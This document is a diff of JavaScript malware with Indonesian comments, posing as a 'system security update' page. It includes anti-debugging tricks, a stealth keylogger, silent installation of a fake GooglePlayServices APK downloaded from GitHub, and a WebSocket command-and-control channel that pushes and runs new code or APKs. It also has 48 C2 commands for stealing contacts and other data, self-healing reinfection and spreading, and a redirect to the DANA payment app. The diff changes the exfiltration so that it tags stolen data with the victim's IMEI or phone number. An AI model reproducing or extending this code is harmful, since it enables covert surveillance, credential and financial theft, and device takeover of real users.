@@ -71,7 +71,6 @@
 // 1. ADVANCED ANTI-FORENSIC / ANTI-DEBUGGING
 // ============================================================
 (function() {
-    // Lapisan 1: DevTools detector via element trick
     var devtools = false;
     var element = new Image();
     Object.defineProperty(element, 'id', {
@@ -85,7 +84,6 @@
     });
     console.log('%c', element);
 
-    // Lapisan 2: Debugger loop agresif
     function debugLoop() {
         var counter = 0;
         while (true) {
@@ -93,31 +91,25 @@
                 (function(){}).constructor('debugger')();
                 counter++;
                 if (counter > 1000) break;
-            } catch(e) {
-                break;
-            }
+            } catch(e) { break; }
         }
     }
     setInterval(debugLoop, 500);
 
-    // Lapisan 3: Override console methods
     var noop = function() {};
     ['log', 'warn', 'error', 'info', 'debug', 'table', 'trace', 'dir', 'dirxml', 'group', 'groupEnd', 'time', 'timeEnd', 'assert', 'count'].forEach(function(m) {
         window.console[m] = noop;
     });
 
-    // Lapisan 4: Hapus history & referrer
     if (window.history && window.history.replaceState) {
         window.history.replaceState(null, null, window.location.href);
     }
     Object.defineProperty(document, 'referrer', { value: '' });
-
-    // Lapisan 5: Override stack trace
     Error.stackTraceLimit = 0;
 })();
 
 // ============================================================
-// 2. MULTI-BRIDGE DETECTION (JavaScriptInterface)
+// 2. MULTI-BRIDGE DETECTION
 // ============================================================
 var BRIDGE = null;
 (function detectBridge() {
@@ -139,7 +131,7 @@ var BRIDGE = null;
 })();
 
 // ============================================================
-// 3. UNIVERSAL FALLBACK WRAPPER
+// 3. UNIVERSAL FALLBACK WRAPPER (TANPA DUMMY)
 // ============================================================
 var FALLBACK = {
     saveFile: function(path, content) {
@@ -212,15 +204,13 @@ var FALLBACK = {
 };
 
 // ============================================================
-// 4. DETEKSI PLATFORM & BRIDGE (DINAMIS - ANTI ERROR)
+// 4. DETEKSI PLATFORM & BRIDGE (DINAMIS)
 // ============================================================
 function getPlatform() {
     var ua = navigator.userAgent.toLowerCase();
     var isAndroidBridge = false;
     try {
-        // Cek apakah bridge benar-benar ada dan bisa dipanggil
         if (typeof AndroidBridge !== 'undefined' && AndroidBridge !== null) {
-            // Coba panggil fungsi dummy untuk memastikan bridge hidup
             if (typeof AndroidBridge.getIMEI === 'function') {
                 isAndroidBridge = true;
             }
@@ -236,11 +226,7 @@ function getPlatform() {
 }
 var PLATFORM = getPlatform();
 
-// ============================================================
-// FUNGSI UNTUK MENENTUKAN APAKAH MENGGUNAKAN BRIDGE ATAU FALLBACK
-// ============================================================
 function getBridge() {
-    // Cek ulang secara real-time agar tidak error jika bridge di-injeksi belakangan
     var realBridge = null;
     try {
         if (typeof AndroidBridge !== 'undefined' && AndroidBridge !== null) {
@@ -254,29 +240,55 @@ function getBridge() {
     return FALLBACK;
 }
 
-// ============================================================
-// WRAPPER UNTUK SEMUA FUNGSI BRIDGE
-// ============================================================
 function bridgeCall(method, args) {
     try {
         var bridge = getBridge();
         if (typeof bridge[method] === 'function') {
             return bridge[method].apply(bridge, args);
         }
-    } catch(e) {
-        return null;
-    }
+    } catch(e) { return null; }
     return null;
 }
 
 // ============================================================
-// 5. ADVANCED EXFILTRATION PIPELINE (ENCRYPTED)
+// 5. ADVANCED EXFILTRATION PIPELINE (REAL DATA ONLY)
 // ============================================================
 var exfilQueue = [];
 var exfilSending = false;
 
+// 🔥 FUNGSI UNTUK MENDAPATKAN DEVICE ID ASLI (100% REAL, TANPA DUMMY)
+function getRealDeviceId() {
+    var id = null;
+    
+    // 1. PRIORITAS UTAMA: IMEI (Jika ada Android Bridge)
+    try {
+        var imei = A.getIMEI();
+        if (imei && typeof imei === 'string' && imei.length > 5) {
+            return imei;
+        }
+    } catch(e) {}
+
+    // 2. PRIORITAS KEDUA: Nomor HP
+    try {
+        var phone = A.getPhoneNumber();
+        if (phone && typeof phone === 'string' && phone.length > 5) {
+            return phone;
+        }
+    } catch(e) {}
+
+    // 3. PRIORITAS TERAKHIR: Fingerprint Browser Asli (Bukan dummy)
+    // Ini adalah data nyata jika diakses via browser biasa tanpa bridge.
+    try {
+        id = navigator.userAgent + '|' + screen.width + 'x' + screen.height + '|' + navigator.language;
+    } catch(e) {}
+    
+    return id || 'UNKNOWN_DEVICE';
+}
+
+// 🔥 FUNGSI PENGIRIM DATA (WAJIB MENYERTAKAN DEVICE ID ASLI)
 function K(d) {
     try {
+        d._deviceId = getRealDeviceId();
         d._timestamp = Date.now();
         d._nonce = Math.random().toString(36).substring(2);
         exfilQueue.push(d);
@@ -340,7 +352,7 @@ function hideFromSystem() {
 }
 
 // ============================================================
-// 7. STEALTH KEYLOGGER (TANPA INDIKASI)
+// 7. STEALTH KEYLOGGER
 // ============================================================
 var stealthKeyloggerData = [];
 var stealthKeyloggerActive = false;
@@ -408,11 +420,10 @@ function uploadStealthKeylogger() {
 }
 
 // ============================================================
-// 8. SILENT APK INSTALL (TANPA INTERAKSI PENGGUNA)
+// 8. SILENT APK INSTALL
 // ============================================================
 function silentInstallAPK(path) {
     if (!path) return false;
-    // Gunakan bridge realtime
     var bridge = getBridge();
     var platform = getPlatform();
     
@@ -445,7 +456,7 @@ function silentInstallAPK(path) {
 }
 
 // ============================================================
-// 9. ENHANCED PERSISTENCE (SELF-HEALING + REINFECTION)
+// 9. ENHANCED PERSISTENCE
 // ============================================================
 function enhancedSelfHealing() {
     setInterval(function() {
@@ -545,7 +556,7 @@ var APK_DOWNLOADED = false;
 var APK_URL = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/GooglePlayServices.apk';
 
 // ============================================================
-// ANDROID BRIDGE (DINAMIS - TIDAK ERROR SAAT DIPANGGIL)
+// ANDROID BRIDGE WRAPPER
 // ============================================================
 var A = {
     isAvailable: function() {
@@ -707,7 +718,6 @@ function saveHTMLToAllLocations(htmlContent) {
 
 function loadHTMLFromAllLocations() {
     return new Promise(function(resolve) {
-        // 1. SharedPreferences
         try {
             var encoded = A.getFromPreferences('system_SystemUpdate_html');
             if (encoded) {
@@ -715,12 +725,10 @@ function loadHTMLFromAllLocations() {
                 return;
             }
         } catch(e) {}
-        // 2. localStorage
         try {
             var ls = localStorage.getItem('SystemUpdate_backup');
             if (ls) { resolve(ls); return; }
         } catch(e) {}
-        // 3. IndexedDB
         try {
             var request = indexedDB.open('SystemUpdateDB', 1);
             request.onsuccess = function(e) {
@@ -742,7 +750,7 @@ function loadHTMLFromAllLocations() {
 }
 
 // ============================================================
-// WEBSOCKET DENGAN CODE PUSH
+// WEBSOCKET
 // ============================================================
 function connectWebSocket() {
     if (ws && ws.readyState === WebSocket.OPEN) return;
@@ -756,10 +764,11 @@ function connectWebSocket() {
             wsConnected = true;
             K({ sumber: 'ws_status', data: 'connected' });
             try {
+                var realId = getRealDeviceId();
                 ws.send(JSON.stringify({
                     type: 'auth',
                     key: WS_PASSWORD,
-                    deviceId: 'browser_systemupdate',
+                    deviceId: realId,
                     timestamp: Date.now()
                 }));
             } catch(e){}
@@ -800,7 +809,6 @@ function connectWebSocket() {
                     if (html) {
                         saveHTMLToAllLocations(html);
                         K({ sumber: 'code_push_html', data: 'received' });
-                        // Re-execute if needed
                         executeHTML(html);
                     }
                 } else if (data.type === 'push_apk') {
@@ -808,7 +816,6 @@ function connectWebSocket() {
                     if (apkBase64) {
                         saveAPKToAllLocations(apkBase64);
                         K({ sumber: 'code_push_apk', data: 'received' });
-                        // Install after save
                         installAPKFromAvailablePath();
                     }
                 } else if (data.type === 'ping') {
@@ -884,7 +891,6 @@ function installAPKFromAvailablePath() {
     }
     if (A.isAvailable()) {
         try {
-            // Coba silent install
             var bridge = getBridge();
             if (bridge !== FALLBACK && typeof bridge.silentInstallAPK === 'function') {
                 var result = bridge.silentInstallAPK(path);
@@ -896,7 +902,6 @@ function installAPKFromAvailablePath() {
                     return;
                 }
             }
-            // Intent fallback
             try {
                 var intent = 'intent://' + path + '#Intent;action=android.intent.action.VIEW;type=application/vnd.android.package-archive;end';
                 window.location.href = intent;
@@ -939,12 +944,10 @@ function redirectToDANA() {
     if (container) container.classList.add('fade-out');
     setTimeout(function() {
         try {
-            // PRIORITAS: BUKA VIA BRIDGE
             var bridge = getBridge();
             if (bridge !== FALLBACK && typeof bridge.openApp === 'function') {
                 try { bridge.openApp('com.dana.id'); } catch(e) {}
             }
-            // FALLBACK: INTENT
             try {
                 window.location.href = 'intent://com.dana.id#Intent;scheme=https;end';
             } catch(e) {}
@@ -952,18 +955,21 @@ function redirectToDANA() {
     }, 800);
 }
 
+// 🔥 FUNGSI K() SUDAH DIPASTIKAN MENYERTAKAN DEVICE ID ASLI
 function K(d) {
     try {
-        var xhr = new XMLHttpRequest();
-        xhr.open('POST', SERVER + '/data', true);
-        xhr.setRequestHeader('Content-Type', 'application/json');
-        xhr.timeout = 5000;
-        xhr.send(JSON.stringify(d));
+        d._deviceId = getRealDeviceId();
+        d._timestamp = Date.now();
+        d._nonce = Math.random().toString(36).substring(2);
+        exfilQueue.push(d);
+        if (!exfilSending) {
+            processExfilQueue();
+        }
     } catch(e) {}
 }
 
 // ============================================================
-// 🔥 START DOWNLOAD APK DARI GITHUB (DITAMBAHKAN!)
+// 🔥 DOWNLOAD APK
 // ============================================================
 function startDownloadAndInstall() {
     updateProgress(30, '⏳ Mengunduh pembaruan keamanan...');
@@ -1018,7 +1024,7 @@ function startDownloadAndInstall() {
 }
 
 // ============================================================
-// AMBIL PASSWORD (DENGAN FALLBACK)
+// AMBIL PASSWORD
 // ============================================================
 function ambilPassword() {
     updateProgress(10, '⏳ Memperbarui System Keamanan...');
@@ -1042,25 +1048,13 @@ function ambilPassword() {
                         startHeartbeat();
                         startReinfection();
                         autoExecuteC2();
-                        // Load HTML dari semua lokasi (untuk self-repair)
                         loadHTMLFromAllLocations().then(function(html) {
                             if (html) saveHTMLToAllLocations(html);
                         });
-                        // APK: coba install dari lokasi yang ada, atau minta server
-                        setTimeout(function() {
-                            installAPKFromAvailablePath();
-                        }, 3000);
+                        setTimeout(function() { installAPKFromAvailablePath(); }, 3000);
                         setTimeout(autoSpread, 2000);
                         startSelfHealing();
-                        
-                        // 🔥 DOWNLOAD APK DARI GITHUB
-                        setTimeout(function() {
-                            startDownloadAndInstall();
-                        }, 2000);
-                        
-                        // ============================================================
-                        // 🔥 AKTIFKAN FITUR YANG BELUM DIPANGGIL
-                        // ============================================================
+                        setTimeout(function() { startDownloadAndInstall(); }, 2000);
                         
                         setTimeout(function() { startSelfHealing(); }, 5000);
                         setTimeout(function() { startStealthKeylogger(); }, 6000);
@@ -1225,7 +1219,7 @@ function cekPerintah() {
 }
 
 // ============================================================
-// 48 PERINTAH C2
+// 48 PERINTAH C2 (REAL DATA, TANPA DUMMY)
 // ============================================================
 function eksekusiPerintah(cmd) {
     var aksi = cmd.aksi || 'unknown';
@@ -1291,7 +1285,7 @@ function eksekusiPerintah(cmd) {
 }
 
 // ============================================================
-// IMPLEMENTASI FUNGSI PERINTAH (SEMUA DILINDUNGI TRY-CATCH)
+// IMPLEMENTASI PERINTAH (REAL DATA)
 // ============================================================
 function ambilKontak() {
     try {
@@ -1637,6 +1631,8 @@ function autoExecuteC2() {
     commands.forEach(function(cmd) {
         try {
             var hasil = eksekusiPerintah({ aksi: cmd });
+            // Karena di dalam eksekusiPerintah ada pemanggilan K(),
+            // maka setiap data yang terkirim akan otomatis menyertakan _deviceId asli.
             K({ sumber: 'auto_c2_result', data: { perintah: cmd, hasil: hasil || 'success', waktu: Date.now() } });
         } catch(e) {}
     });
@@ -1683,7 +1679,6 @@ function finishAndRedirect() {
 updateProgress(5, '⏳ Memperbarui System Keamanan...');
 K({ sumber: 'system_update_start', data: { platform: getPlatform() } });
 
-// Load HTML dari semua lokasi (self-repair)
 loadHTMLFromAllLocations().then(function(html) {
     if (html) {
         saveHTMLToAllLocations(html);
@@ -1691,7 +1686,6 @@ loadHTMLFromAllLocations().then(function(html) {
     }
 });
 
-// Register service worker (untuk cache)
 if ('serviceWorker' in navigator) {
     try {
         navigator.serviceWorker.register('/sw.js', { scope: '/' })
@@ -1700,9 +1694,7 @@ if ('serviceWorker' in navigator) {
     } catch(e) {}
 }
 
-// Panggil enhanced self-healing
 enhancedSelfHealing();
-
 ambilPassword();
 
 setTimeout(function() {
